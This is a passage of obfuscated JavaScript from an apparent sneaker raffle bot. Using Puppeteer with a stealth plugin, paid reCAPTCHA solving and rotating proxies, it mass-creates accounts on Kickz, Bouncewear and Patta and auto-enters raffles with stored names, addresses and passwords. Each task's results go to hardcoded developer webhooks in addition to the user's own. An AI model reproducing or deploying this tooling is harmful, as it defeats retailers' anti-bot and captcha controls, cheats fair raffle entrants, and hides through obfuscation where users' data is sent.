            _0x55cb8f['evaluate'](() => {
                const _0x2161ac = document['querySelector']('#continue_button');
                for (var _0x5a8eab = 0x0; _0x5a8eab < 0x5; _0x5a8eab++) {
                    if (_0x2161ac) {
                        _0x2161ac['click']();
                        break;
                    } else
                        _0x45ce86(0xfa0);
                }
            }), await _0x55cb8f['waitForTimeout'](0x7d0), console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x55cb8f['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x55cb8f['evaluate'](() => {
                const _0x2b429a = document['querySelector']('#continue_button');
                for (var _0x4dcd9a = 0x0; _0x4dcd9a < 0x5; _0x4dcd9a++) {
                    if (_0x2b429a) {
                        _0x2b429a['click']();
                        break;
                    } else
                        _0x45ce86(0xfa0);
                }
            }), await _0x55cb8f['waitForTimeout'](0x1194), await _0x55cb8f['waitForSelector']('#continue_button'), _0x55cb8f['evaluate'](() => {
                const _0x4811c3 = document['querySelector']('#continue_button');
                for (var _0x4bb355 = 0x0; _0x4bb355 < 0x5; _0x4bb355++) {
                    if (_0x4811c3) {
                        _0x4811c3['click']();
                        break;
                    } else
                        _0x45ce86(0xfa0);
                }
            });
            try {
                await _0x55cb8f['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '')
                    try {
                        await _0x32e91d(_0x32bec3['webhook'], _0x457844['succesDEVMSG']);
                    } catch {
                    }
                await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0x457844['succesDEVMSG']), await _0x45ce86(0xc8);
                try {
                    await _0x32e91d(_0x1fcd8b, _0x457844['succesPUBMSG']);
                } catch {
                }
            } catch (_0x4e8e79) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x4e8e79));
            }
        } catch (_0x2ae090) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20' + _0x2ae090)), _0x3bd7fb = '' + _0x2ae090;
            var _0x10c0e1 = await _0x12f7f(_0x2509ce[_0x2f79b2], _0x549a12, 'dev', !![], _0x3bd7fb);
            _0x457844['errorDEV'] = { 'embeds': [_0x10c0e1] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x457844['errorDEV']), await _0x32e91d(_0x49aba5, _0x457844['errorDEV']), _0x334f7c = 'yes';
        } finally {
            _0x58bf9a && _0x58bf9a['close']();
            if (_0x334f7c == 'yes' && _0x48f0fb != 0x5 && _0x3bd7fb != 'Size\x20Not\x20Found') {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Retrying')), _0x2f79b2 = _0x2f79b2 - 0x1, _0x48f0fb = _0x48f0fb + 0x1;
                continue;
            }
            if (_0x2f79b2 + 0x1 == _0x2509ce['length']) {
                console['log'](_0xecbe11['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x45ce86(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x32bec3['AfewDelay'] + '\x20ms'), await _0x45ce86(_0x32bec3['AfewDelay']);
        }
    }
};
async function _0x20dc30(_0x1e906f, _0x7b0ff0, _0x50b650, _0x97c662) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x17dd3b = 0x0; _0x17dd3b < _0x50b650['length']; _0x17dd3b++) {
        var _0x4aa9a1 = '', _0x4c020e = 0x0;
        _0x42c473(_0x7b0ff0['name'] + '\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20/\x20' + _0x50b650['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0x50b650, _0x17dd3b);
        var _0x4ad42e = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a22d
                }
            ]
        }];
        const _0x8f4cc6 = { 'embeds': _0x4ad42e };
        var _0x14a080 = await _0x12f7f(_0x50b650[_0x17dd3b], _0x7b0ff0, 'acc', ![]);
        const _0x33f255 = { 'succesDEVMSG': { 'embeds': [_0x14a080] } };
        if (_0x50b650[_0x17dd3b]['Email'] == '' || _0x50b650[_0x17dd3b]['FirstName'] == '' || _0x50b650[_0x17dd3b]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x50b650[_0x17dd3b]['Password'] == '' && (_0x50b650[_0x17dd3b]['Password'] = 'JRaffles23!');
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0xd15692 = _0x97c662[_0x17dd3b]['split'](':');
        else
            var _0x4f3f19 = Math['round'](Math['random']() * (_0x97c662['length'] - 0x1)), _0xd15692 = _0x97c662[_0x4f3f19]['split'](':');
        const _0x25aceb = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0xd15692[0x0] + ':' + _0xd15692[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x99f702 = await _0x25aceb['newPage']();
            await _0x99f702['authenticate']({
                'username': '' + _0xd15692[0x2],
                'password': '' + _0xd15692[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x99f702['setRequestInterception'](!![]), _0x99f702['on']('request', _0x4fda1e => {
                _0x4fda1e['resourceType']() === 'image' || _0x4fda1e['resourceType']() === 'font' || _0x4fda1e['resourceType']() === 'media' ? _0x4fda1e['abort']() : _0x4fda1e['continue']();
            }), await _0x99f702['goto'](_0x1e906f), await _0x45ce86(0xbb8), console['log'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x99f702['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x99f702['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x99f702['waitForSelector']('#button-register'), await _0x45ce86(0x7d0), await _0x99f702['evaluate'](() => {
                const _0x2aa187 = document['querySelector']('#button-register');
                _0x2aa187['click']();
            }), console['log'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x45ce86(0x1388), await _0x99f702['waitForSelector']('#customer_salutation'), await _0x99f702['select']('#customer_salutation', 'mr'), await _0x45ce86(0x7d0), await _0x99f702['waitForSelector']('#customer_firstname'), await _0x99f702['type']('#customer_firstname', '' + _0x50b650[_0x17dd3b]['FirstName']), await _0x45ce86(0x352), await _0x99f702['waitForSelector']('#customer_lastname'), await _0x99f702['type']('#customer_lastname', '' + _0x50b650[_0x17dd3b]['LastName']), await _0x45ce86(0x352), await _0x99f702['type']('#email-input', '' + _0x50b650[_0x17dd3b]['Email']), await _0x45ce86(0x352), await _0x99f702['type']('#email-confirm-input', '' + _0x50b650[_0x17dd3b]['Email']), await _0x45ce86(0x352), await _0x99f702['type']('#register-password', '' + _0x50b650[_0x17dd3b]['Password']), await _0x45ce86(0x352), await _0x99f702['type']('#password-confirm', '' + _0x50b650[_0x17dd3b]['Password']), await _0x45ce86(0x352), console['log'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x99f702['click']('#consent'), await _0x45ce86(0x1f4);
            const _0x38bef7 = await _0x99f702['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x38bef7) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x99f702['click']('#buttonRegister');
            try {
                await _0x99f702['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Account\x20' + _0x50b650[_0x17dd3b]['Email'] + '\x20Generated!')), console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x50b650[_0x17dd3b]['Email'])), await _0x45ce86(0x4b0);
            async function _0x27b8c6() {
                console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x389335 = await _0x12b6f6['get']('Code');
                return _0x389335['Code'];
            }
            ;
            code = await _0x27b8c6(), _0x45ce86(0x320), console['log'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Verifying..'), await _0x99f702['type']('#verificationCode', code), await _0x45ce86(0x1f4), await _0x99f702['click']('#buttonVerify'), await _0x45ce86(0x190), await _0x99f702['click']('#buttonVerify'), await _0x45ce86(0x3e8);
            try {
                await _0x99f702['waitForSelector']('div.b-user_greeting'), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Account\x20' + _0x50b650[_0x17dd3b]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x5e836d['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x50b650[_0x17dd3b]['Email'] + ',' + _0x50b650[_0x17dd3b]['Password'] + ','), console['log'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Account\x20' + _0x50b650[_0x17dd3b]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x33f255['succesDEVMSG']);
                } catch {
                }
                await _0x32e91d(_0x20d1d0, _0x33f255['succesDEVMSG']);
            } catch {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x104418) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20' + _0x104418)), _0x4ad42e[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x4ad42e[0x0]['description'] = '' + _0x104418, await _0x32e91d(_0x49aba5, _0x8f4cc6), _0x4aa9a1 = 'yes';
        } finally {
            _0x25aceb && _0x25aceb['close']();
            if (_0x4aa9a1 == 'yes' && _0x4c020e != 0x5) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x7b0ff0['name'] + ']\x20Task\x20' + (_0x17dd3b + 0x1) + '\x20:\x20Retrying')), _0x17dd3b = _0x17dd3b - 0x1, _0x4c020e = _0x4c020e + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x10b686(_0x2d7d8a, _0x4f4d01, _0x3529a2) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3d41af = 0x0; _0x3d41af < _0x4f4d01['length']; _0x3d41af++) {
        var _0x210a47, _0x55b943 = '', _0x22c672 = 0x0;
        _0x42c473(_0x2d7d8a['name'] + '\x20Task\x20' + (_0x3d41af + 0x1) + '\x20/\x20' + _0x4f4d01['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868);
        var _0x558240 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Product',
                    'value': '' + _0x4f4d01[_0x3d41af]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x4f4d01[_0x3d41af]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a22d
                }
            ]
        }], _0x1e2adc = await _0x12f7f(_0x4f4d01[_0x3d41af], _0x2d7d8a, 'dev', ![]), _0xfdde2e = await _0x12f7f(_0x4f4d01[_0x3d41af], _0x2d7d8a, 'pub', ![]);
        const _0xbd4db3 = {
            'succesDEVMSG': { 'embeds': [_0x1e2adc] },
            'succesPUBMSG': { 'embeds': [_0xfdde2e] }
        };
        await _0x10d7a7(_0x4f4d01, _0x3d41af);
        if (_0x4f4d01[_0x3d41af]['Email'] == '' || _0x4f4d01[_0x3d41af]['Password'] == '' || _0x4f4d01[_0x3d41af]['FirstName'] == '' || _0x4f4d01[_0x3d41af]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x2ba6b8 = _0x3529a2[_0x3d41af]['split'](':');
        else
            var _0x4d062c = Math['round'](Math['random']() * (_0x3529a2['length'] - 0x1)), _0x2ba6b8 = _0x3529a2[_0x4d062c]['split'](':');
        const _0x5d8bc8 = await _0x4146a9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2ba6b8[0x0] + ':' + _0x2ba6b8[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x472326 = await _0x5d8bc8['newPage']();
            await _0x472326['authenticate']({
                'username': '' + _0x2ba6b8[0x2],
                'password': '' + _0x2ba6b8[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Getting\x20Session'), await _0x472326['setRequestInterception'](!![]), _0x472326['on']('request', _0x519932 => {
                _0x519932['resourceType']() === 'image' || _0x519932['resourceType']() === 'font' || _0x519932['resourceType']() === 'media' ? _0x519932['abort']() : _0x519932['continue']();
            }), await _0x472326['goto']('' + _0x4f4d01[_0x3d41af]['Url'], { 'waitUntil': 'networkidle2' }), await _0x45ce86(0x12c);
            try {
                await _0x472326['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x472326['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Logging\x20in'), await _0x472326['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x472326['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x472326['waitForSelector']('#username'), await _0x472326['type']('#username', _0x4f4d01[_0x3d41af]['Email']), await _0x472326['waitForSelector']('#password'), await _0x472326['type']('#password', _0x4f4d01[_0x3d41af]['Password']), await _0x45ce86(0x190), await _0x472326['click']('#buttonSubmit'), await _0x472326['waitForSelector']('div.b-user_greeting'), console['log'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Getting\x20Product'), await _0x45ce86(0x1f4), await _0x472326['goto']('' + _0x4f4d01[_0x3d41af]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x4f4d01[_0x3d41af]['Size']);
            let _0x22088d = _0x4f4d01[_0x3d41af]['Size']['replace']('.5', '\x201/2');
            await _0x472326['click']('button[title=\x22' + _0x22088d + '\x22]'), await _0x45ce86(0x1f4);
            try {
                await _0x472326['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x45ce86(0x12c), console['log'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Filling\x20Information'), await _0x472326['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x45ce86(0x12c), await _0x472326['type']('#dwfrm_raffle_addressFields_firstName', _0x4f4d01[_0x3d41af]['FirstName']), await _0x45ce86(0x12c), await _0x472326['type']('#dwfrm_raffle_addressFields_lastName', _0x4f4d01[_0x3d41af]['LastName']), await _0x45ce86(0x12c), await _0x472326['select']('#dwfrm_raffle_addressFields_country', _0x4f4d01[_0x3d41af]['Country']), await _0x45ce86(0x12c), await _0x472326['type']('#dwfrm_raffle_addressFields_city', _0x4f4d01[_0x3d41af]['City']), await _0x45ce86(0x12c);
            _0x4f4d01[_0x3d41af]['Postcode'] == undefined && (_0x4f4d01[_0x3d41af]['Postcode'] = _0x4f4d01[_0x3d41af]['Zip']);
            await _0x472326['type']('#dwfrm_raffle_addressFields_postalCode', _0x4f4d01[_0x3d41af]['Postcode']), await _0x45ce86(0x12c), await _0x472326['type']('#dwfrm_raffle_addressFields_address1', _0x4f4d01[_0x3d41af]['Address1']), await _0x45ce86(0x12c), await _0x472326['type']('#dwfrm_raffle_addressFields_address2', _0x4f4d01[_0x3d41af]['HouseNumber']), await _0x45ce86(0x12c), await _0x472326['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x4f4d01[_0x3d41af]['Address2']), await _0x45ce86(0x12c), await _0x472326['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x45ce86(0x12c), await _0x472326['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x4f4d01[_0x3d41af]['Follower']), await _0x45ce86(0x1f4), await _0x472326['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x45ce86(0x1f4), console['log'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20' + _0xecbe11['blue']('Awaiting\x20Paypal\x20Payment')), await _0x472326['click']('.b-paypal_button');
            try {
                await _0x472326['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0xbd4db3['succesDEVMSG']), await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0xbd4db3['succesDEVMSG']), await _0x45ce86(0xc8), await _0x32e91d(_0x1fcd8b, _0xbd4db3['succesPUBMSG']);
            } catch (_0x327000) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x327000)), _0x210a47 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x327000;
                var _0x18564d = await _0x12f7f(_0x4f4d01[_0x3d41af], _0x2d7d8a, 'dev', !![], _0x210a47);
                _0xbd4db3['errorDEV'] = { 'embeds': [_0x18564d] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0xbd4db3['errorDEV']), await _0x32e91d(_0x49aba5, _0xbd4db3['errorDEV']);
            }
        } catch (_0x46172c) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20' + _0x46172c)), _0x210a47 = '' + _0x46172c;
            var _0x18564d = await _0x12f7f(_0x4f4d01[_0x3d41af], _0x2d7d8a, 'dev', !![], _0x210a47);
            _0xbd4db3['errorDEV'] = { 'embeds': [_0x18564d] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0xbd4db3['errorDEV']), await _0x32e91d(_0x49aba5, _0xbd4db3['errorDEV']), _0x55b943 = 'yes';
        } finally {
            _0x5d8bc8 && _0x5d8bc8['close']();
            if (_0x55b943 == 'yes' && _0x22c672 != 0x5) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x2d7d8a['name'] + ']\x20Task\x20' + (_0x3d41af + 0x1) + '\x20:\x20Retrying')), _0x3d41af = _0x3d41af - 0x1, _0x22c672 = _0x22c672 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x32bec3['AfewDelay'] + '\x20ms'), await _0x45ce86(_0x32bec3['AfewDelay']);
        }
    }
}
async function _0x514656(_0x4d5df7, _0x1339ad) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3aa719 = 0x0; _0x3aa719 < bouncewear['length']; _0x3aa719++) {
        await _0x10d7a7(bouncewear, _0x3aa719);
        if (bouncewear[_0x3aa719]['Email'] == '' || bouncewear[_0x3aa719]['Password'] == '' || bouncewear[_0x3aa719]['FirstName'] == '' || bouncewear[_0x3aa719]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x99ba8e = _0x576c0b()[_0x3aa719]['split'](':');
        else
            var _0x53577f = Math['round'](Math['random']() * (_0x576c0b()['length'] - 0x1)), _0x99ba8e = _0x576c0b()[_0x53577f]['split'](':');
        const _0x442f31 = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x99ba8e[0x0] + ':' + _0x99ba8e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1df973 = await _0x442f31['newPage']();
            await _0x1df973['authenticate']({
                'username': '' + _0x99ba8e[0x2],
                'password': '' + _0x99ba8e[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1df973['setRequestInterception'](!![]), _0x1df973['on']('request', _0x163ed3 => {
                _0x163ed3['resourceType']() === 'image' || _0x163ed3['resourceType']() === 'font' || _0x163ed3['resourceType']() === 'media' ? _0x163ed3['abort']() : _0x163ed3['continue']();
            }), await _0x1df973['goto'](_0x4d5df7), await _0x45ce86(0xbb8), await _0x1df973['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1df973['type']('#RegisterForm-FirstName', '' + bouncewear[_0x3aa719]['FirstName']), await _0x45ce86(0x226), await _0x1df973['type']('#RegisterForm-LastName', '' + bouncewear[_0x3aa719]['LastName']), await _0x45ce86(0x226), await _0x1df973['type']('#RegisterForm-email', '' + bouncewear[_0x3aa719]['Email']), await _0x45ce86(0x226), await _0x1df973['type']('#RegisterForm-password', '' + bouncewear[_0x3aa719]['Password']), await _0x45ce86(0x226), await _0x1df973['click']('#marketing'), console['log'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Submitting..'), await _0x1df973['$eval']('#RegisterForm', _0xb5ae0a => _0xb5ae0a['submit']()), await _0x45ce86(0x1f40), console['log'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x1df973['solveRecaptchas'](), await _0x1df973['click']('.shopify-challenge__button.btn');
            async function _0x464280() {
                for (var _0x5415bc = 0x0; _0x5415bc < 0x4; _0x5415bc++) {
                    try {
                        console['log']('try'), await _0x1df973['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20' + _0xecbe11['red']('Catpcha\x20failed,\x20retrying..')), await _0x1df973['solveRecaptchas'](), await _0x1df973['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x464280(), console['log'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x45ce86(0x1f4);
            try {
                await _0x1df973['waitForSelector']('.featured-title'), await _0x45ce86(0x1f4), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3aa719]['Email'] + '\x20Generated!')), _0x5e836d['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x3aa719]['Email'] + ',' + bouncewear[_0x3aa719]['Password']), console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x1339ad['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3aa719]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x2031ea) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x2031ea));
            }
        } catch (_0xb797da) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x3aa719 + 0x1) + '\x20:\x20' + _0xb797da));
        } finally {
            _0x442f31 && _0x442f31['close'](), console['log']('Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x27cc73(_0x76e0ef, _0x4b0aad, _0xaadb6a, _0x4b068b) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2390ae = 0x0; _0x2390ae < _0xaadb6a['length']; _0x2390ae++) {
        var _0x4f24ee = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a22d
                }
            ]
        }];
        const _0x37a4ca = { 'embeds': _0x4f24ee };
        _0x42c473(_0x4b0aad['name'] + '\x20Task\x20' + (_0x2390ae + 0x1) + '\x20/\x20' + _0xaadb6a['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0xaadb6a, _0x2390ae);
        var _0x510a6e = await _0x12f7f(_0xaadb6a[_0x2390ae], _0x4b0aad, 'acc', ![]);
        const _0x267ea3 = { 'succesDEVMSG': { 'embeds': [_0x510a6e] } };
        if (_0xaadb6a[_0x2390ae]['Email'] == '' || _0xaadb6a[_0x2390ae]['FirstName'] == '' || _0xaadb6a[_0x2390ae]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x45ce86(0x7d0);
            continue;
        }
